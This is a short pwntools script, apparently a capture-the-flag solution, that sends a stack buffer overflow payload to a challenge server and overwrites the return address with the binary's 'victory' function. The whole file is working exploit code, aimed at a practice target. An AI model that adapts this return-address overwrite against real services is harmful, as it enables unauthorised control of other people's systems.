from pwn import *

exe = ELF("echo")


target = remote("pwn.ctf.secso.cc", 5002)


buf = b"A"*(0x40+8) + p64(exe.symbols["victory"])
target.sendline(buf)
target.send("\n")

target.interactive()
